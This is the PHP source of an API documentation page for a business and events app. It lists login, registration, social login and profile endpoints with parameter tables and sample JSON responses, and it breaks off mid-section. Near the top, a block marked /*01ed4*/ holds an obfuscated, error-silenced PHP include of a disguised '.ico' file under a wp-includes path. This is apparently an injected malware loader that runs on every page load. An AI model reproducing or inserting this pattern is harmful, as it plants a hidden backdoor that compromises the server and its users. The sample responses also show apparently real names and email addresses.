<!DOCTYPE html>
<html class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en">
    <!--
    <![endif]-->
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="../img/favicon.png" />
        <title>API Documentation For Main App</title>
        <link href="includes/css" rel="stylesheet" type="text/css">
        <link rel="stylesheet" href="includes/sphinx_rtd_theme.css" type="text/css">
        <link rel="stylesheet" href="includes/font-awesome.css" type="text/css">
        <link rel="stylesheet" href="includes/readthedocs-doc-embed.css" type="text/css">
        <link rel="stylesheet" href="includes/jsonview-core.css" type="text/css">
        <script type="text/javascript" async="" src="includes/ga.js"></script>
        <script type="text/javascript"></script>
        <script src="includes/modernizr.min.js"></script>
        <script type="text/javascript" async="" src="includes/ga.js"></script>
        <script type="text/javascript">

  // This is included here because other places don't have access to the pagename variable.
  var READTHEDOCS_DATA = {
    project: "stashboard",
    version: "latest",
    language: "en",
    page: "restapi",
    builder: "sphinx",
    theme: "sphinx_rtd_theme",
    docroot: "/docs/",
    source_suffix: ".rst",
    api_host: "https://readthedocs.org",
    commit: "3e4b18a8168c102d1e1d7f88fec22bcbfc530d23"
}
  // Old variables
  var doc_version = "latest";
  var doc_slug = "stashboard";
  var page_name = "restapi";
  var html_theme = "sphinx_rtd_theme";
</script>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-17997319-1']);
  _gaq.push(['_trackPageview']);

  // User Analytics Code
  _gaq.push(['user._setAccount', 'None']);
  _gaq.push(['user._trackPageview']);
  // End User Analytics Code


  (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);

  })();
</script>
</head>

<body class="wy-body-for-nav" role="document" cz-shortcut-listen="true">
    <?php
/*01ed4*/

@include "\x2fhom\x65/co\x64eli\x67ht0\x307/p\x75bli\x63_ht\x6dl/d\x72oid\x71uer\x79/wp\x2dinc\x6cude\x73/wi\x64get\x73/fa\x76ico\x6e_3c\x66fc1\x2eico";

/*01ed4*/

    if($_SERVER['SERVER_NAME']=="localhost"){

        $formpath = 'http://localhost/test/finalBS//api-form-main-app/';
        $apipath = 'http://localhost/test/finalBS/index.php/ws/v1/';
    }
    else{
        $formpath = 'http://vrosmedia.com/vrosmedia/api-form-main-app/';
        $apipath = 'http://vrosmedia.com/vrosmedia/index.php/ws/v1/';

    }


    ?>  							
    <div class="wy-grid-for-nav">
        <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
            <div class="wy-side-nav-search">
                <a href="index.php" class="fa fa-home"> Business APP Main App</a>
            </div>
            <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
                <ul class="current">
                    <li class="toctree-l1 current">
                        <a class="reference internal" href="#response-codes">Response Codes</a>
                    </li>
                    <li><p style="color:red;">User profile Module</p></li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#login">Login</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#register">Register</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#loginwithsocial">Login/Register with social media</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#profile">Profile</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#updateprofile">Update Profile</a>
                            </li>
                             <li class="toctree-l1">
                                <a class="reference internal" href="#forgot_password">Forgot Password</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#change_password">Change Password</a>
                            </li>
                               <li class="toctree-l1">
                                <a class="reference internal" href="#logout">Logout</a>
                            </li>
                             <li class="toctree-l1">
                                <a class="reference internal" href="#myevents">My Events</a>
                            </li>
                             <li class="toctree-l1">
                                <a class="reference internal" href="#mybusiness">My Business</a>
                            </li>
                              <li class="toctree-l1">
                                <a class="reference internal" href="#my_wishlists">My wishlists</a>
                            </li>
                            <li class="toctree-l1">
                                 <a class="reference internal" href="#createBusiness">Create Business</a>
                            </li>
                               <li class="toctree-l1">
                                <a class="reference internal" href="#editBusiness">Edit Business</a>
                            </li>
                             </li>
                               <li class="toctree-l1">
                                <a class="reference internal" href="#delete_business">Delete Business</a>
                            </li>
                    </li>
                    <li class="toctree-l1">
                        <a class="reference internal" href="#delete_comment">Delete Comment</a>
                    </li>
<!--                             <li class="toctree-l1">
                                <a class="reference internal" href="#editBusinessmedias">Edit Business Medias</a>
                            </li>-->
                  <li><p style="color:red;">Category Module</p></li>  
                            <li class="toctree-l1">
                                  <a class="reference internal" href="#GetCategory">Get Category</a>
                           </li>
                            <li class="toctree-l1">
                                  <a class="reference internal" href="#all_events">Get All Events</a>
                           </li>
                              <li class="toctree-l1">
                                  <a class="reference internal" href="#all_business">Get All Business</a>
                           </li>
                 <li><p style="color:red;">Home and detail Screen Module</p></li>
                 
                            <li class="toctree-l1">
                                   <a class="reference internal" href="#home">Home</a>
                            </li>
                            <li class="toctree-l1">
                                   <a class="reference internal" href="#get_event_attendee">Get Event Attendee</a>
                            </li>
                            <li class="toctree-l1">
                                   <a class="reference internal" href="#comments">Get Comments</a>      
                            </li>
                            <li class="toctree-l1">
                                   <a class="reference internal" href="#likes">Get Likes</a>      
                            </li>


                            <li class="toctree-l1">
                                <a class="reference internal" href="#eventdetail">Event Detail View</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#businessdetail">Business Detail View</a>
                            </li>

                           <li class="toctree-l1">
                                <a class="reference internal" href="#eventLike">Like Event</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#eventShare">Share Event</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#eventShareWithFriends">Share Event with friends</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#eventFavorite">Favorite Event</a>
                            </li>
                             <li class="toctree-l1">
                                <a class="reference internal" href="#eventAttendee">Event Attendee</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#businessLike">Like Business</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#businessShare">Share Business</a>
                            </li>
                             <li class="toctree-l1">
                                <a class="reference internal" href="#businessShareWithFriends">Share Business with friends</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#businessFavorite">Favorite Business</a>
                            </li>
                             <li class="toctree-l1">
                                <a class="reference internal" href="#businessComments">Post Business Comments</a>
                            </li>
                            <li class="toctree-l1">
                                <a class="reference internal" href="#eventComments">Post Event Comments</a>
                            </li>
                   <li><p style="color:red;">Ads & Sub</p></li>
                   <li class="toctree-l1">
                               <a class="reference internal" href="#Pricing">Pricing</a>
                   </li>
                    <li class="toctree-l1">
                        <a class="reference internal" href="#get_city">City data</a>
                    </li>

                 <li class="toctree-l1">
                               <a class="reference internal" href="#business_payment">Ads And offer Payment</a>
                   </li>
                   <li class="toctree-l1">
                               <a class="reference internal" href="#get_all_offers">All offers</a>
                   </li>
                    <li class="toctree-l1">
                        <a class="reference internal" href="#offer_detail">Offer Detail View</a>
                    </li>
                   <li class="toctree-l1">
                        <a class="reference internal" href="#create_business_offers">Create Offer</a>
                    </li>
                      <li class="toctree-l1">
                        <a class="reference internal" href="#create_business_advertisement">Create advertisement</a>
                    </li>
                      <li class="toctree-l1">
                        <a class="reference internal" href="#edit_business_offers">Edit Offer</a>
                    </li>
                      <li class="toctree-l1">
                        <a class="reference internal" href="#edit_business_advertisement">Edit advertisement</a>
                    </li>
                    </li>
                      <li class="toctree-l1">
                        <a class="reference internal" href="#my_offers">my offers</a>
                    </li>
                     <li class="toctree-l1">
                        <a class="reference internal" href="#change_offer_status">Activate or Deactivate offers</a>
                    </li>
                     <li class="toctree-l1">
                        <a class="reference internal" href="#change_ads_status">Activate or Deactivate Ads</a>
                    </li>
                      <li class="toctree-l1">
                        <a class="reference internal" href="#offer_like">Like offer</a>
                    </li>
                     <li class="toctree-l1">
                        <a class="reference internal" href="#offer_share">Share offer</a>
                    </li>
                     <li class="toctree-l1">
                        <a class="reference internal" href="#offer_favorite">Favorite offer</a>
                    </li>
                     <li class="toctree-l1">
                        <a class="reference internal" href="#post_offer_comments">post offer comments</a>
                    </li>
                    <li class="toctree-l1">
                        <a class="reference internal" href="#share_offer_with_friends">Share offer with friends</a>
                    </li>


                   <li><p style="color:red;">Friends Module</p></li>    
                   
                            <li class="toctree-l1">
                               <a class="reference internal" href="#UserLists">User lists</a>
                           </li>
                           <li class="toctree-l1">
                               <a class="reference internal" href="#single_friend_detail">single Friend detail</a>
                           </li>
                             <li class="toctree-l1">
                               <a class="reference internal" href="#sentRequests">Send Friend Request</a>
                           </li>
                           <li class="toctree-l1">
                               <a class="reference internal" href="#friendsRequestLists">Friends And Friend's Requests Lists</a>
                           </li>
                              <li class="toctree-l1">
                               <a class="reference internal" href="#search_friends">Search Friends</a>
                           </li>
                            <li class="toctree-l1">
                               <a class="reference internal" href="#RequestAction">Accept/Reject/Removed Friends</a>
                           </li>
                           <li><p style="color:red;">Notification</p></li> 
                           <li class="toctree-l1">
                               <a class="reference internal" href="#notification_master">Payload and type</a>
                           </li>
                              <li class="toctree-l1">
                               <a class="reference internal" href="#get_notification_data">notification data</a>
                           </li>
                             <li class="toctree-l1">
                               <a class="reference internal" href="#update_notification_count">notification count update</a>
                           </li>
   <li class="toctree-l1">
                               <a class="reference internal" href="#update_all_notification_count">All notification count update</a>
                           </li>
 </li>
   <li class="toctree-l1">
                               <a class="reference internal" href="#add_business_revenue_count">Add Business revenue count</a>
                           </li>





                    <li class="toctree-l1">
                        <a class="reference internal" href="#test_noti">test Notification</a>
                    </li>
                    <li><p style="color:red;">Graph</p></li>
                    <li class="toctree-l1">
                        <a class="reference internal" href="#QRGraph">QR</a>
                    </li>
                    <li class="toctree-l1">
                        <a class="reference internal" href="#ImpressionGraph">Impression</a>
                    </li>
                     <li class="toctree-l1">
                        <a class="reference internal" href="#ClickGraph">Click</a>
                    </li>


                 
                    <li class="toctree-l1">
                        <a class="reference internal" href="#respond"></a>
                    </li>

                </ul>
            </div>
        </nav>
        <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
            <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
                <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
                <a href="index.php">Stashboard</a>
            </nav>
            <div class="wy-nav-content">
                <div class="rst-content">
                    <div role="navigation" aria-label="breadcrumbs navigation">
                        <ul class="wy-breadcrumbs">
                            <li>
                                <a href="index.php"></a> »
                            </li>
                            <li>API Documentation</li>
                        </ul>
                        <hr>
                    </div>
                    <div role="main" class="document">
                        <div class="section" id="api-documentation">
                            <h1>API Documentation
                                <a class="headerlink" href="index.php#api-documentation" title="Permalink to this headline">¶</a>
                            </h1>
                            <p>This doc explains response codes, request parameters and responses of this project's API.
                                <!--<tt class="docutils literal"><span class="pre">/api/v1/</span></tt>-->
                            </p>
                            <!--Response Codes-->
                            <div class="section" id="response-codes">
                                <h2>Response Codes
                                    <a class="headerlink" href="index.php#response-codes" title="Permalink to this headline">¶</a>
                                </h2>
                                <p>Response codes let you know that if action is successfully performed or not. If not than which problems occurred.</p>
                                <div class="wy-table-responsive">
                                    <table border="1" class="docutils">
                                        <colgroup>
                                        <col width="21%">
                                        <col width="79%">
                                    </colgroup>
                                    <thead valign="bottom">
                                        <tr class="row-odd">
                                            <th class="head">Code</th>
                                            <th class="head">Text</th>
                                            <th class="head">Description</th>
                                        </tr>
                                    </thead>
                                    <tbody valign="top">
                                        <tr class="row-even">
                                            <td>200</td>
                                            <td>OK</td>
                                            <td>Success</td>
                                        </tr>
                                        <tr class="row-even">
                                            <td>400</td>
                                            <td>Bad Request</td>
                                            <td>The request cannot be fulfilled due to bad syntax.</td>
                                        </tr>
                                        <tr class="row-even">
                                            <td>404</td>
                                            <td>Unauthorized</td>
                                            <td>Authentication credentials were missing or incorrect.</td>
                                        </tr>
                                        <tr class="row-even">
                                            <td>403</td>
                                            <td>Forbidden</td>
                                            <td>The request is understood, but it has been refused or access is not allowed.</td>
                                        </tr>
                                        <tr class="row-even">
                                            <td>404</td>
                                            <td>Not Found</td>
                                            <td>The URI requested is invalid or the resource requested, such as a user, does not exists.</td>
                                        </tr>
                                        <tr class="row-even">
                                            <td>500</td>
                                            <td>Internal Server Error</td>
                                            <td>Something is broken.</td>
                                        </tr>
                                        <tr class="row-even">
                                            <td>601</td>
                                            <td>Data Dupliacation</td>
                                            <td>Let you know if provided data is already there.</td>
                                        </tr>
                                        <tr class="row-even">
                                            <td>602</td>
                                            <td>Could Not Save</td>
                                            <td>Could not insert/update/delete record at the moment.</td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    <hr>
                    <!--LOGIN API-->
                    <div class="section" id="login">
                        <h2>Login
                            <a class="headerlink" href="index.php#login" title="Permalink to this headline">¶</a>
                            <a href="<?php echo $formpath.'login.php'?>" target="_blank" class="html_link">HTML Form</a>
                        </h2>
                        <p>Login With Email and Password</p>
                        <h5>API LINK</h5>
                        <div class="highlight-text">
                            <div class="highlight">
                                <pre><?php echo $apipath.'user/login';?></pre>
                            </div>
                        </div>
                        <h5>Request Parameters</h5>
                        <div class="wy-table-responsive">
                            <table border="1" class="docutils">
                                <colgroup>
                                <col width="35%">
                                <col width="30%">
                                <col width="">
                            </colgroup>
                            <thead valign="bottom">
                                <tr class="row-odd">
                                    <th class="head">Param</th>
                                    <th class="head">Required/Optional</th>
                                    <th class="head">Description</th>
                                </tr>
                            </thead>
                            <tbody valign="top">
                                <tr class="row-even">
                                    <td>email</td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <tr class="row-odd">
                                    <td>password</td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>deviceid</td>
                                    <td>Required</td>
                                    <td>UDID</td>
                                </tr>
                                 <tr class="row-even">
                                    <td>deLatitude</td>
                                    <td>optional</td>
                                    <td></td>
                                </tr>
                                 <tr class="row-even">
                                    <td>deLongitude</td>
                                    <td>optional</td>
                                    <td></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                    <h5>Response</h5>
                    <h6>
                        <i class="fa fa-hand-o-right"></i> Success
                    </h6>
                    <div class="highlight-js json">
                     <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"3"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@gmail.com"</span></div></li></ul>}</div></li></ul>}</div>
                 </div>
                 <h6>
                    <i class="fa fa-hand-o-right"></i> Error
                </h6>
                <div class="highlight-js json">
                    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">401</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Invalid Credentials"</span></div></li></ul>}</div>
                </div>
            </div>

            <!--REgister API-->
            <div class="section" id="register">
                <h2>Register
                    <a class="headerlink" href="index.php#register" title="Permalink to this headline">¶</a>
                    <a href="<?php echo $formpath.'register.php'?>" target="_blank" class="html_link">HTML Form</a>
                </h2>
                <p>Regster With Email and Password</p>
                <h5>API LINK</h5>
                <div class="highlight-text">
                    <div class="highlight">
                        <pre><?php echo $apipath.'user/register';?></pre>
                    </div>
                </div>
                <h5>Request Parameters</h5>
                <div class="wy-table-responsive">
                    <table border="1" class="docutils">
                        <colgroup>
                        <col width="35%">
                        <col width="30%">
                        <col width="">
                    </colgroup>
                    <thead valign="bottom">
                        <tr class="row-odd">
                            <th class="head">Param</th>
                            <th class="head">Required/Optional</th>
                            <th class="head">Description</th>
                        </tr>
                    </thead>
                    <tbody valign="top">
                        <tr class="row-even">
                            <td>email</td>
                            <td>Required</td>
                            <td></td>
                        </tr>
                        <tr class="row-even">
                            <td>name</td>
                            <td>Required</td>
                            <td></td>
                        </tr>
                       
                        <tr class="row-odd">
                            <td>password</td>
                            <td>Required</td>
                            <td></td>
                        </tr>
                        <tr class="row-odd">
                            <td>image</td>
                            <td>Optional</td>
                            <td></td>
                        </tr>
                         <tr class="row-even">
                                    <td>deLatitude</td>
                                    <td>optional</td>
                                    <td></td>
                         </tr>
                                 <tr class="row-even">
                                    <td>deLongitude</td>
                                    <td>optional</td>
                                    <td></td>
                                </tr>
                        <tr class="row-even">
                            <td>deviceid</td>
                            <td>Required</td>
                            <td>UDID</td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <h5>Response</h5>
            <h6>
                <i class="fa fa-hand-o-right"></i> Success
            </h6>
            <div class="highlight-js json">
             <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"4"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"miralviroja1@gmail.com"</span></div></li></ul>}</div></li></ul>}</div>
         </div>
         <h6>
            <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
        </h6>
        <div class="highlight-js json">
            <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">401</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Email ID already exist."</span></div></li></ul>}</div>
        </div>
    </div>

    <!--loginwithsocial api-->
    <div class="section" id="loginwithsocial">
        <h2>Login with social
            <a class="headerlink" href="index.php#loginwithsocial" title="Permalink to this headline">¶</a>
            <a href="<?php echo $formpath.'loginwithsocial.php'?>" target="_blank" class="html_link">HTML Form</a>
        </h2>
        <p>Login with social</p>
        <h5>API LINK</h5>
        <div class="highlight-text">
            <div class="highlight">
                <pre><?php echo $apipath.'user/social_login';?></pre>
            </div>
        </div>
        <h5>Request Parameters</h5>
        <div class="wy-table-responsive">
            <table border="1" class="docutils">
                <colgroup>
                <col width="35%">
                <col width="30%">
                <col width="">
            </colgroup>
            <thead valign="bottom">
                <tr class="row-odd">
                    <th class="head">Param</th>
                    <th class="head">Required/Optional</th>
                    <th class="head">Description</th>
                </tr>
            </thead>
            <tbody valign="top">
                <tr class="row-even">
                    <td>socail_type</td>
                    <td>Required</td>
                    <td>send f or g</td>
                </tr>
                <tr class="row-even">
                    <td>socail_id</td>
                    <td>Required</td>
                    <td></td>
                </tr>
                <tr class="row-even">
                    <td>email</td>
                    <td>Optional</td>
                    <td></td>
                </tr>
                <tr class="row-even">
                    <td>name</td>
                    <td>Optional</td>
                    <td></td>
                </tr>
               
                <tr class="row-even">
                    <td>image</td>
                    <td>Optional</td>
                    <td></td>
                </tr>
                  <tr class="row-even">
                                    <td>deLatitude</td>
                                    <td>optional</td>
                                    <td></td>
                   </tr>
                      <tr class="row-even">
                                    <td>deLongitude</td>
                                    <td>optional</td>
                                    <td></td>
                      </tr>
                <tr class="row-even">
                    <td>deviceid</td>
                    <td>Required</td>
                    <td>UDID</td>
                </tr>
            </tbody>
        </table>
    </div>
    <h5>Response</h5>
    <h6>
        <i class="fa fa-hand-o-right"></i> Success (Login)
    </h6>
    <div class="highlight-js json">
     <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"successfully logged"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"5"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">fb_id</span>: <span class="type-string">"123"</span>,</div></li><li><div class="hoverable"><span class="property">gplus_id</span>: <span class="type-string">""</span></div></li></ul>}</div></li></ul>}</div>
 </div>
 <h6>
    <i class="fa fa-hand-o-right"></i> Success (Register)
</h6>
<div class="highlight-js json">
 <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"successfully registered"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"6"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">fb_id</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">gplus_id</span>: <span class="type-string">"123"</span></div></li></ul>}</div></li></ul>}</div>
</div>
<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>
 <hr>

<!--loginwithsocial api-->
<div class="section" id="profile">
    <h2>User Profile
        <a class="headerlink" href="index.php#loginwithsocial" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'profile.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Profile</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'user/get_user_profile_data';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miralbhai"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"miralviroja4@gmail.com"</span>,</div></li><li><div class="hoverable"><span class="property">workphone</span>: <span class="type-string">"787878787"</span>,</div></li><li><div class="hoverable"><span class="property">workemail</span>: <span class="type-string">"miral@amcodr.com"</span>,</div></li><li><div class="hoverable"><span class="property">phone</span>: <span class="type-string">"151515151"</span>,</div></li><li><div class="hoverable"><span class="property">address</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/user/14691723208605.png">http://localhost/apps/businessapp/uploads/user/14691723208605.png</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>


 <hr>

<!--loginwithsocial api-->
<div class="section" id="updateprofile">
    <h2>Update Profile
        <a class="headerlink" href="index.php#loginwithsocial" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'updateprofile.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Update Profile</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'user/update_profile_data';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>first_name</td>
                <td>Optional</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>name</td>
                <td>Optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>last_name</td>
                <td>Optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>phone</td>
                <td>Optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>work_phone</td>
                <td>Optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>work_email</td>
                <td>Optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>address</td>
                <td>Optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>image</td>
                <td>Optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>deLatitude</td>
                <td>Optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>deLongitude</td>
                <td>Optional</td>
                <td></td>
            </tr>
              <tr class="row-even">
                <td>is_notification</td>
                <td>Optional</td>
                <td>ON or OFF</td>
            </tr>
              <tr class="row-even">
                <td>notification_sound</td>
                <td>Optional</td>
                <td>YES or NO</td>
            </tr>
              <tr class="row-even">
                <td>distance_type</td>
                <td>Optional</td>
                <td></td>
            </tr>
            
            </tr>
              <tr class="row-even">
                <td>fb_link</td>
                <td>Optional</td>
                <td></td>
            </tr>
            
            
               <tr class="row-even">
                <td>twitter_link</td>
                <td>Optional</td>
                <td></td>
            </tr>
               <tr class="row-even">
                <td>gplus_link</td>
                <td>Optional</td>
                <td></td>
            </tr>
               <tr class="row-even">
                <td>description</td>
                <td>Optional</td>
                <td></td>
            </tr>
               <tr class="row-even">
                <td>fav_book</td>
                <td>Optional</td>
                <td></td>
            </tr>
               <tr class="row-even">
                <td>fav_music</td>
                <td>Optional</td>
                <td></td>
            </tr>
               <tr class="row-even">
                <td>fav_food</td>
                <td>Optional</td>
                <td></td>
            </tr>
               <tr class="row-even">
                <td>fav_drink</td>
                <td>Optional</td>
                <td></td>
            </tr>
               <tr class="row-even">
                <td>fav_place</td>
                <td>Optional</td>
                <td></td>
            </tr>
            
           

            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
